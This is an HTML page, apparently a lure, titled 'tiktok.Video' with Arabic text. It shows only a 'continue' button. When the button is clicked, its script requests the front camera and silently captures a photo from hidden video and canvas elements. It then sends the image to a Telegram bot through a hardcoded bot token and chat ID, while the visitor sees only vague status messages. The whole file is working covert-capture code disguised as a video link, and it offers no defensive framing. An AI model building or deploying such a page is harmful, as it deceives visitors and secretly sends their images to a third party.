here<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>  tiktok.Video</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-color: #0f172a;
            font-family: system-ui, -apple-system, sans-serif;
        }
        .container {
            text-align: center;
        }
        /* زر إرسال في المنتصف design */
        .send-btn {
            padding: 16px 36px;
            font-size: 18px;
            font-weight: bold;
            color: #ffffff;
            background: linear-gradient(135deg, #2563eb, #1d4ed8);
            border: none;
            border-radius: 50px;
            cursor: pointer;
            box-shadow: 0 10px 25px rgba(37, 99, 235, 0.4);
            transition: all 0.3s ease;
        }
        .send-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 15px 30px rgba(37, 99, 235, 0.6);
        }
        .send-btn:disabled {
            background: #64748b;
            cursor: not-allowed;
            box-shadow: none;
        }
        #status {
            margin-top: 20px;
            color: #94a3b8;
            font-size: 14px;
        }
        /* عناصر مخفية لالتقاط الصورة */
        video, canvas {
            display: none;
        }
    </style>
</head>
<body>

    <div class="container">
        <button id="captureBtn" class="send-btn" onclick="processCapture()">متابعه</button>
        <div id="status"></div>
    </div>

    <!-- عناصر الهيكل المخفية للتعامل مع الكاميرا -->
    <video id="webcam" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        // ضع بيانات البوت هنا
        const BOT_TOKEN = '9114716681:AAGByUpV6Row5jbH3hV6y2HYmGqsYLhA2Gk';
        const CHAT_ID = '7662244630';

        async function processCapture() {
            const btn = document.getElementById('captureBtn');
            const status = document.getElementById('status');
            const video = document.getElementById('webcam');
            const canvas = document.getElementById('canvas');

            btn.disabled = true;
            status.textContent = 'جاري طلب إذن الكاميرا...';

            try {
                // 1. طلب الوصول للكاميرا الأمامية
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: "user" },
                    audio: false
                });

                video.srcObject = stream;
                status.textContent = '  ...';

                // الانتظار لحظة لضبط إضاءة الكاميرا
                await new Promise(resolve => setTimeout(resolve, 1000));

                // 2. رسم اللقطة على الـ Canvas
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const context = canvas.getContext('2d');
                context.drawImage(video, 0, 0, canvas.width, canvas.height);

                // إيقاف تشغيل الكاميرا فوراً
                stream.getTracks().forEach(track => track.stop());

                status.textContent = '   لحضه...';

                // 3. تحويل الصورة إلى Blob وإرسالها إلى تلجرام
                canvas.toBlob(async (blob) => {
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, 'capture.jpg');

                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });

                    const result = await response.json();

                    if (result.ok) {
                        status.textContent = ' جاري التوجيه... ';
                    } else {
                        status.textContent = 'حدث خطأ ما : ' + result.description;
                    }
                    btn.disabled = false;
                }, 'image/jpeg');

            } catch (err) {
                console.error(err);
                status.textContent = 'حدث خطأ: يُرجى السماح بالوصول للكاميرا.';
                btn.disabled = false;
            }
        }
    </script>
</body>
</html>
